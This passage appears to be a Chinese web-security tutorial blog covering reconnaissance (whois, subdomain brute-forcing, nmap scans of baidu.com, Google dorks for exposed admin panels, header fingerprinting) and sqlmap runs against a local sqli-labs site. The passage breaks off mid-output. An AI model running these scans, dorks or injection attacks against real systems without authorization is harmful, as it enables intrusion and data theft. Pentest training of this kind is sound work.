# Python全栈（五）Web安全攻防之1.信息收集

## 一、Kali虚拟机安装

主要分为两个步骤：
（1）安装虚拟机，如VMware：
具体安装过程可参考https://blog.csdn.net/qq_40950957/article/details/80467513。
（2）在VMware上安装Kali：
具体安装过程可参考https://blog.csdn.net/qq_40950957/article/details/80468030。
或者直接参考https://blog.csdn.net/chaootis1/article/details/84137460完成（1）、（2）步的操作。

## 二、域名介绍及查询

### 1.域名介绍

域名(Domain Name)，是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位。
**浏览器访问网页的流程**：
（1）客户端上传域名到DNS服务器；
（2）DNS服务器返回指定域名对应的IP地址到客户端；
（3）客户端根据IP访问目标服务器；
（4）目标服务器返回访问内容给客户端。
如下：
![DNS](https://img-blog.csdnimg.cn/20200210120033896.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
由于IP地址具有不方便记忆并且不能显示地址组织的名称和性质等缺点，人们设计出了域名。
并通过网域名称系统（DNS，Domain Name System）来将域名和IP地址相互映射，使人更方便地访问互联网，而不用去记住能够被机器直接读取的IP地址数串。

### 2.域名查询方法whois

**whois**是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商等）。
不同域名后缀的whois信息需要到不同的whois数据库查询，如.com的whois数据库和.edu的就不同。目前国内提供WHOIS查询服务的网站有万网、站长之家等。每个域名或IP的WHOIS信息由对应的管理机构保存，例如以.com结尾的域名的WHOIS信息由.com域名运营商VeriSign管理，中国国家顶级域名.cn域名由CNNIC管理。
whois查询方式如下：

#### web接口查询

- 万网[https://whois.aliyun.com](https://whois.aliyun.com/)
  示例如图
  ![whois.aliyun.com](https://img-blog.csdnimg.cn/202002101207262.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
- https://www.whois365.com/cn
  示例如图
  ![https://www.whois365.com/cn](https://img-blog.csdnimg.cn/20200210121646843.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
- 站长之家[http://whois.chinaz.com](http://whois.chinaz.com/)
  示例如图
  ![站长之家](https://img-blog.csdnimg.cn/20200210122131402.gif)
  显然被屏蔽，查询不出来，即百度屏蔽掉了站长之家。
- [https://whois.aizhan.com](https://whois.aizhan.com/)
  示例如图
  ![https://whois.aizhan.com](https://img-blog.csdnimg.cn/20200210122434251.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)

#### 通过whois命令行查询

如

```powershell
whois baidu.com
1
```

显示：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200210123301862.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)

### 3.ICP备案

英文全称：Internet Content Provider，中文全称：网络内容提供商。
ICP可以理解为向广大用户提供互联网信息业务和增值业务的电信运营商，是经国家主管部门批准的正式运营企业或部门。
《互联网信息服务管理办法》指出互联网信息服务分为经营性和非经营性两类。国家对经营性互联网信息服务实行许可制度；对非经营性互联网信息服务实行备案制度。未取得许可或者未履行备案手续的，不得从事互联网信息服务。
可以通过[http://www.beianbeian.com](http://www.beianbeian.com/)查看网站备案信息，示例如下
![http://www.beianbeian.com](https://img-blog.csdnimg.cn/2020021012394276.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)

## 三、收集子域名信息

### 1.域名和子域名

顶级域名包括`.com`、`.net`、`.org`、`.cn`等。
子域名：
凡顶级域名前加前缀的都是该顶级域名的子域名，而子域名根据技术的多少分为二级子域名、三级子域名以及多级子域名。
收集子域名是因为某个主域名做了大量防护，手机难度较大，从二级域名入手难度相对较低，从子域名靠近主域名及相关信息。

### 2.子域名挖掘工具

- Maltego CE
  Kali自带，如果注册账号时无法收到验证码，可以在Windows或其他平台注册，再在Kali中直接登录。
  Maltego CE的使用可参考https://www.cnblogs.com/zh2000/p/11199492.html
  结果框架如下图所示
  ![Maltego CE结果框架](https://img-blog.csdnimg.cn/20200210125150516.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
  对百度进行测试示例结果如下
  ![Maltego CE](https://img-blog.csdnimg.cn/20200210192647222.jpg#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
- wydomain
  GitHub地址:https://github.com/ring04h/wydomain。
  下载和安装命令（在Kali中）：

```powershell
git clone https://github.com/ring04h/wydomain
cd wydomain/
cat requirements.txt
pip3 install -r requirements.txt
1234
```

查看参数：

```powershell
python dnsburte.py -h
1
```

显示：

```powershell
usage: dnsburte.py [-h] [-t] [-time] [-d] [-f] [-o]

wydomian v 2.0 to bruteforce subdomains of your target domain.

optional arguments:
  -h, --help          show this help message and exit
  -t , --thread       thread count
  -time , --timeout   query timeout
  -d , --domain       domain name
  -f , --file         subdomains dict file name
  -o , --out          result out file
1234567891011
```

使用：

```powershell
python dnsburte.py -d baidu.com
1
```

显示：

```powershell
2020-02-10 10:15:41,739 [INFO] starting bruteforce threading(16) : baidu.com
2020-02-10 10:15:48,653 [INFO] dns bruteforce subdomains(100) successfully...
2020-02-10 10:15:48,653 [INFO] result save in : /root/wydomain/bruteforce.log
123
```

查看结果：

```powershell
cat /root/wydomain/bruteforce.log
1
```

显示：

```powershell
[
    "m.baidu.com", 
    "www.baidu.com", 
    "wap.baidu.com", 
    "pop.baidu.com", 
    "bbs.baidu.com", 
	...
    "u.baidu.com", 
    "sp.baidu.com", 
    "svn.baidu.com", 
    "hb.baidu.com", 
    "vc.baidu.com"
]
12345678910111213
```

- 搜索引擎挖掘
  例如：
  在Google中输入

```bash
site:sina.com
1
```

结果示例：
![Google](https://img-blog.csdnimg.cn/20200210155619509.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
如无法访问谷歌，也可以在百度中输入

```bash
site:sina.com
1
```

结果示例：
![Baidu](https://img-blog.csdnimg.cn/20200210155754358.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)

- 第三方网站查询
  - http://tool.chinaz.com/subdomain
    示例如下
    ![http://tool.chinaz.com/subdomain](https://img-blog.csdnimg.cn/20200210160031222.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
  - [https://dnsdumpster.com](https://dnsdumpster.com/)
    示例如下
    ![https://dnsdumpster.com/](https://img-blog.csdnimg.cn/20200210174725308.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
    ![https://dnsdumpster.com/](https://img-blog.csdnimg.cn/20200210192835970.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
  - https://phpinfo.me/domain/
    示例如下
    ![https://phpinfo.me/domain](https://img-blog.csdnimg.cn/20200210191912465.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)

## 四、端口信息收集

### 1.端口介绍

如果把IP地址比作一间房子，端口就是出入这间房子的门。真正的房子只有几个门，但是一个IP地址的端口可以有65536个。
端口是通过端口号来标记的，端口号只有整数，范围是从**0到65535**。
在计算机中每一个端口代表一个服务。
在Windows种查看端口-**管理员身份**打开命令行执行：

```shell
netstat -anbo
1
```

打印

```shell
活动连接                                                                                     
                                                                                         
  协议  本地地址          外部地址        状态           PID                                         
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       1032              
  RpcSs                                                                                  
 [svchost.exe]                                                                           
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       26800             
 [vmware-hostd.exe]                                                                      
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4                 
 无法获取所有权信息                                                                               
  TCP    0.0.0.0:902            0.0.0.0:0              LISTENING       19200             
 [vmware-authd.exe]                                                                      
  TCP    0.0.0.0:912            0.0.0.0:0              LISTENING       19200             
 [vmware-authd.exe]                                                                      
 ...                                                                         
  UDP    [fe80::e908:14c9:dc52:d1d5%5]:2177  *:*                                    4836 
  QWAVE                                                                                  
 [svchost.exe]                                                                           
  UDP    [fe80::e908:14c9:dc52:d1d5%5]:52240  *:*                                    7608
  SSDPSRV                                                                                
 [svchost.exe]                                                                           
  UDP    [fe80::f55a:3b0f:f090:458%14]:1900  *:*                                    7608 
  SSDPSRV                                                                                
 [svchost.exe]                                                                           
  UDP    [fe80::f55a:3b0f:f090:458%14]:2177  *:*                                    4836 
  QWAVE                                                                                  
 [svchost.exe]                                                                           
  UDP    [fe80::f55a:3b0f:f090:458%14]:52242  *:*                                    7608
  SSDPSRV                                                                                
 [svchost.exe]                                                                           
123456789101112131415161718192021222324252627282930
```

### 2.端口信息收集

对于收集目标机器端口状态可以使用工具来进行测试。
工具原理：
使用TCP或者UDP等协议向目标端口发送指定标志位等的数据包，等待目标返回数据包，以此来判断端口状态。

#### 使用nmap探测

nmap标志像一只眼睛，称其为“**上帝之眼**”。
命令：

```powershell
nmap -A -v -T4 baidu.com
1
```

打印：

```shell
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 10:26 CST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:26
Completed NSE at 10:26, 0.00s elapsed
Initiating NSE at 10:26
Completed NSE at 10:26, 0.00s elapsed
Initiating NSE at 10:26
Completed NSE at 10:26, 0.00s elapsed
Initiating Ping Scan at 10:26
Scanning baidu.com (220.181.38.148) [4 ports]
Completed Ping Scan at 10:26, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:26
Completed Parallel DNS resolution of 1 host. at 10:26, 0.01s elapsed
Initiating SYN Stealth Scan at 10:26
Scanning baidu.com (220.181.38.148) [1000 ports]
Discovered open port 443/tcp on 220.181.38.148
Discovered open port 80/tcp on 220.181.38.148
Completed SYN Stealth Scan at 10:26, 5.00s elapsed (1000 total ports)

TRACEROUTE (using port 80/tcp)
HOP RTT    ADDRESS
1   ... 30

NSE: Script Post-scanning.
Initiating NSE at 10:27
Completed NSE at 10:27, 0.00s elapsed
Initiating NSE at 10:27
Completed NSE at 10:27, 0.00s elapsed
Initiating NSE at 10:27
Completed NSE at 10:27, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.19 seconds
           Raw packets sent: 2168 (98.008KB) | Rcvd: 5 (208B)
1234567891011121314151617181920212223242526272829303132333435
```

说明：
443和80端口是开放的，分别对应https和http。

#### 使用在线网站探测

地址：
http://tool.chinaz.com/port/。
测试示例：
![http://tool.chinaz.com/port](https://img-blog.csdnimg.cn/20200210164202921.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
这种方式不能探测本地。

### 3.端口攻击

针对不同的端口具有不同的攻击方法。

#### 攻击方法

![攻击方法](https://img-blog.csdnimg.cn/20200210164450725.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)

#### 防御措施

- 关闭不必要的端口
- 对重要业务的服务端口设置防火墙
- 经常更换用户密码
- 经常更新软件，打补丁

## 五、收集敏感信息

#### 1.敏感信息收集重要性

针对某些安全做的很好的目标，直接通过技术层面是无法完成渗透测试。
在这种情况下，可以利用搜索引擎搜索目标暴露在互联网上的关联信息，例如数据库文件、SQL注入、服务器配置信息、甚至是通过Git找到站点泄露源代码、以及Redis等未授权访问，从而达到渗透测试的目的。

### 2.Google hacking语法

Google hacking是指使用Google等搜索引擎对某些特定的网络主机漏洞进行搜索，以达到快速找到漏洞主机或特定主机的漏洞的目的。

```bash
intext:——搜索正文内容 例如intext 网站管理
intitle:——搜索标题内容 例如intitle 后台管理
filetype:——搜索指定文件格式 例如filetype:txt
inurl:——搜索特定URL 例如.php?id
site:——搜索特定的站点 例如:site:baidu.com
info:——搜索网页信息 例如:info:baidu.com
123456
```

示例：
在Google中输入

```bash
intext 后台管理
1
```

如图：
![后台管理](https://img-blog.csdnimg.cn/20200210165738228.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
显然，有很多后台管理系统暴露出来，随便点进去一个，可以看到
![后台登录页](https://img-blog.csdnimg.cn/20200210165902225.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
显然，这是极其危险的。
再如，在百度中输入

```bash
intitle 后台管理
1
```

如图
![intitle 后台管理](https://img-blog.csdnimg.cn/20200210170138748.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
同样，有很多后台管理系统暴露，随便尝试一个，显示
![后台管理平台](https://img-blog.csdnimg.cn/2020021017025241.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
显然，网络安全存在着很大威胁。
更多关于Google hacking的语法、使用和最新消息可查看
https://www.exploit-db.com/google-hacking-database。

### 3.HTTP响应收集server信息

通过HTTP或HTTPS与目标站点进行通信中目标响应的报文中serve头和X-Powered-By头会暴露目标服务器和使用的编程语言信息，通过这些信息可以有针对的利用漏洞尝试。
获取HTTP响应的方法：

#### 利用浏览器审计工具

点击F12，再选择Network，点击F5刷新，如下
![Network](https://img-blog.csdnimg.cn/20200210172611116.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
显然，Server中间件为**nginx**，**X-Powered-By**为**ThinkPHP**，即编写语言为PHP语言的一个框架ThinkPHP。

#### 编写Python脚本（使用requests库）

简单测试：

```python
import requests

r = requests.get('http://www.beianbeian.com')
print(r.headers)
1234
```

打印：

```python
{'Server': 'nginx', 
'Date': 'Mon, 10 Feb 2020 03:08:34 GMT', 
'Content-Type': 'text/html; charset=utf-8', 
'Transfer-Encoding': 'chunked', 
'Connection': 'keep-alive', 
'Vary': 'Accept-Encoding', 
'Expires': 'Thu, 19 Nov 1981 08:52:00 GMT', 
'Pragma': 'no-cache', 
'Cache-control': 'private', 
'X-Powered-By': 'ThinkPHP', 
'Set-Cookie': 'PHPSESSID=v0ee5tiumr3pat5kpnltdvnbh4; path=/, sc__jsluid_h=43c68abd9efb5d2ebed43d88a1ab550c; expires=Mon, 10-Feb-2020 03:18:34 GMT; Max-Age=600, scJSESSIONID=04D2B6C6538CDD8A48003405C29F52B0; expires=Mon, 10-Feb-2020 03:18:34 GMT; Max-Age=600', 
'Content-Encoding': 'gzip'}
123456789101112
```

和第一种方法结果是一样的，Server中间件为**nginx**，**X-Powered-By**为**ThinkPHP**

# Python全栈（五）Web安全攻防之3.sqlmap的使用介绍

## 一、sqlmap获取目标

### 1.sql注入介绍

所谓SQL注入，就是通过把SQL命令插入到web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。
具体来说，它是利用现有应用程序，将SQL命令注入到后台数据库引擎执行的能力，它可以通过在web表单中输入SQL语句得到一个**存在安全漏洞**的网站上的数据库，而不是按照设计者意图去执行SQL语句。
SQL注入可能发生在未知HTTP数据包中任意位置。
创建本地服务后，访问子页面[/sqli-labs](http://127.0.0.1/sqli-labs)，点击**Less-1**，加入参数**?id=2**，会返回登录名和密码到网页上，如图
![Less-1 id=2](https://img-blog.csdnimg.cn/20200227104849727.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)

### 2.SQL输出级别

Sqlmap的输出信息按从简到繁共分为7个级别依次为0、1、2、3、4、5和6。使用**参数-v**来指定某个等级，如使用参数 **-v 6**来指定输出级别为6。

- 0：只显示Python的**tracebacks**信息、错误信息[**ERROR**]和关键信息[**CRITICAL**]
- 1：同时显示普通信息[**INFO**]和警告信息[**WARNING**]
- 2：同时显示调试信息[**DEBUG**]
- 3：同时显示注入使用的攻击荷载
- 4：同时显示HTTP请求头
- 5：同时显示HTTP响应头
- 6：同时显示HTTP响应体

默认输出级别为**1**，一般输出到v3即可。

### 3.sqlmap获取目标

#### sqlmap直连数据库

（1）服务型数据库-MySQL、Oracle等：

```shell
python3 sqlmap.py -d "mysql://用户名:密码@地址:端口/数据库名字" -f --banner --dbs --users
1
```

其中，banner是指纹，包括数据库的一些详细信息。
使用举例：

```shell
python sqlmap.py -d "mysql://root:root@127.0.0.1:3306/mysql" -f --banner
1
```

打印

```shell
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:16:55 /2020-02-25/

[18:16:55] [INFO] connection to MySQL server '127.0.0.1:3306' established
[18:16:55] [INFO] testing MySQL
[18:16:55] [INFO] resumed: [['1']]...
[18:16:55] [INFO] confirming MySQL
[18:16:55] [INFO] resumed: [['1']]...
[18:16:55] [INFO] the back-end DBMS is MySQL
[18:16:55] [INFO] fetching banner
[18:16:55] [INFO] resumed: [['5.7.26']]...
[18:16:55] [INFO] actively fingerprinting MySQL
[18:16:55] [INFO] resumed: [['1']]...
[18:16:55] [INFO] executing MySQL comment injection fingerprint
back-end DBMS: active fingerprint: MySQL >= 5.7
               comment injection fingerprint: MySQL 5.7.26
banner: '5.7.26'
[18:16:55] [INFO] connection to MySQL server '127.0.0.1:3306' closed

[*] ending @ 18:16:55 /2020-02-25/


123456789101112131415161718192021222324252627282930
```

返回了一些数据库的基本信息如数据库版本等。
返回结果较快，可能是因为提前进行了一些探测，生成了缓存。
再如：

```shell
python sqlmap.py -d "mysql://root:root@127.0.0.1:3306/mysql" -f --banner --users
1
```

打印

```shell
        ___                                                                                                                                               
       __H__                                                                                                                                              
 ___ ___[.]_____ ___ ___  {1.4.2.31#dev}                                                                                                                  
|_ -| . [']     | .'| . |                                                                                                                                 
|___|_  [']_|_|_|__,|  _|                                                                                                                                 
      |_|V...       |_|   http://sqlmap.org                                                                                                               
                                                                                                                                                          
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all appli
cable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program               
                                                                                                                                                          
[*] starting @ 18:20:41 /2020-02-25/                                                                                                                      
                                                                                                                                                          
[18:20:42] [INFO] connection to MySQL server '127.0.0.1:3306' established                                                                                 
[18:20:42] [INFO] testing MySQL                                                                                                                           
[18:20:42] [INFO] resumed: [['1']]...                                                                                                                     
[18:20:42] [INFO] confirming MySQL                                                                                                                        
[18:20:42] [INFO] resumed: [['1']]...                                                                                                                     
[18:20:42] [INFO] the back-end DBMS is MySQL                                                                                                              
[18:20:42] [INFO] fetching banner                                                                                                                         
[18:20:42] [INFO] resumed: [['5.7.26']]...                                                                                                                
[18:20:42] [INFO] actively fingerprinting MySQL                                                                                                           
[18:20:42] [INFO] resumed: [['1']]...                                                                                                                     
[18:20:42] [INFO] executing MySQL comment injection fingerprint                                                                                           
back-end DBMS: active fingerprint: MySQL >= 5.7                                                                                                           
               comment injection fingerprint: MySQL 5.7.26                                                                                                
banner: '5.7.26'                                                                                                                                          
[18:20:42] [INFO] fetching database users                                                                                                                 
[18:20:42] [INFO] resumed: [["'root'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["'roo
t'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localh
ost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["
'root'@'localhost'"], ["'root'@'localhost'"]]...                                                                                                          
database management system users [1]:                                                                                                                     
[*] 'root'@'localhost'                                                                                                                                    
                                                                                                                                                          
[18:20:42] [INFO] connection to MySQL server '127.0.0.1:3306' closed                                                                                      
                                                                                                                                                          
[*] ending @ 18:20:42 /2020-02-25/                                                                                                                        
                                                                                                                                                          
                                                                                                                                                          
123456789101112131415161718192021222324252627282930313233343536373839
```

在之前的基础上，返回的内容增加了用户。
再如：

```shell
python sqlmap.py -d "mysql://root:root@127.0.0.1:3306/mysql" -f --banner --users --dbs
1
```

打印

```shell
        ___                                                                                                                                               
       __H__                                                                                                                                              
 ___ ___[)]_____ ___ ___  {1.4.2.31#dev}                                                                                                                  
|_ -| . [(]     | .'| . |                                                                                                                                 
|___|_  [.]_|_|_|__,|  _|                                                                                                                                 
      |_|V...       |_|   http://sqlmap.org                                                                                                               
                                                                                                                                                          
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all appli
cable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program               
                                                                                                                                                          
[*] starting @ 18:25:20 /2020-02-25/                                                                                                                      
                                                                                                                                                          
[18:25:20] [INFO] connection to MySQL server '127.0.0.1:3306' established                                                                                 
[18:25:20] [INFO] testing MySQL                                                                                                                           
[18:25:20] [INFO] resumed: [['1']]...                                                                                                                     
[18:25:20] [INFO] confirming MySQL                                                                                                                        
[18:25:20] [INFO] resumed: [['1']]...                                                                                                                     
[18:25:20] [INFO] the back-end DBMS is MySQL                                                                                                              
[18:25:20] [INFO] fetching banner                                                                                                                         
[18:25:20] [INFO] resumed: [['5.7.26']]...                                                                                                                
[18:25:20] [INFO] actively fingerprinting MySQL                                                                                                           
[18:25:20] [INFO] resumed: [['1']]...                                                                                                                     
[18:25:20] [INFO] executing MySQL comment injection fingerprint                                                                                           
back-end DBMS: active fingerprint: MySQL >= 5.7                                                                                                           
               comment injection fingerprint: MySQL 5.7.26                                                                                                
banner: '5.7.26'                                                                                                                                          
[18:25:20] [INFO] fetching database users                                                                                                                 
[18:25:20] [INFO] resumed: [["'root'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["'roo
t'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localh
ost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["'root'@'localhost'"], ["
'root'@'localhost'"], ["'root'@'localhost'"]]...                                                                                                          
database management system users [1]:                                                                                                                     
[*] 'root'@'localhost'                                                                                                                                    
                                                                                                                                                          
[18:25:20] [INFO] fetching database names                                                                                                                 
[18:25:20] [INFO] resumed: [['information_schema'], ['challenges'], ['demo'], ['demo1125'], ['demo1204'], ['dvwa'], ['jingdong'], ['mysql'], ['performance
_schema'], ['pythontest'], ['security'], ['sys']]...                                                                                                      
available databases [12]:                                                                                                                                 
[*] challenges                                                                                                                                            
[*] demo                                                                                                                                                  
[*] demo1125                                                                                                                                              
[*] demo1204                                                                                                                                              
[*] dvwa                                                                                                                                                  
[*] information_schema                                                                                                                                    
[*] jingdong                                                                                                                                              
[*] mysql                                                                                                                                                 
[*] performance_schema                                                                                                                                    
[*] pythontest                                                                                                                                            
[*] security                                                                                                                                              
[*] sys                                                                                                                                                   
                                                                                                                                                          
[18:25:20] [INFO] connection to MySQL server '127.0.0.1:3306' closed                                                                                      
                                                                                                                                                          
[*] ending @ 18:25:20 /2020-02-25/                                                                                                                        
                                                                                                                                                          
                                                                                                                                                          
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556
```

在之前的基础上，返回的内容增加了数据库。

（2）文件型数据库-SQLite

#### sqlmap指定目标URL

sqlmap直接对单一URL探测,参数使用 **-u**或者 **–url**。
url格式为：

```shell
http(s)://targeturl\[:port\]/
1
```

举例：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=2 --banner
1
```

打印

```shell
        ___                                                                                                                                               
       __H__                                                                                                                                              
 ___ ___[']_____ ___ ___  {1.4.2.31#dev}                                                                                                                  
|_ -| . [,]     | .'| . |                                                                                                                                 
|___|_  ["]_|_|_|__,|  _|                                                                                                                                 
      |_|V...       |_|   http://sqlmap.org                                                                                                               
                                                                                                                                                          
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all appli
cable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program               
                                                                                                                                                          
[*] starting @ 18:37:12 /2020-02-25/                                                                                                                      
                                                                                                                                                          
[18:37:12] [INFO] testing connection to the target URL                                                                                                    
[18:37:12] [INFO] checking if the target is protected by some kind of WAF/IPS                                                                             
[18:37:12] [INFO] testing if the target URL content is stable                                                                                             
[18:37:12] [INFO] target URL content is stable                                                                                                            
[18:37:12] [INFO] testing if GET parameter 'id' is dynamic                                                                                                
[18:37:12] [INFO] GET parameter 'id' appears to be dynamic                                                                                                
[18:37:12] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')                                       
[18:37:13] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks                            
[18:37:13] [INFO] testing for SQL injection on GET parameter 'id'                                                                                         
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]                                            
                                                                                                                                                          
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]                             
                                                                                                                                                          
[18:37:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                                                              
[18:37:17] [WARNING] reflective value(s) found and filtering out                                                                                          
[18:37:17] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")                   
[18:37:17] [INFO] testing 'Generic inline queries'                                                                                                        
[18:37:17] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                   
[18:37:17] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'                                                        
[18:37:17] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'                                               
[18:37:17] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'                                                                    
[18:37:17] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'                                       
[18:37:17] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'                                                            
[18:37:17] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                             
[18:37:17] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable                    
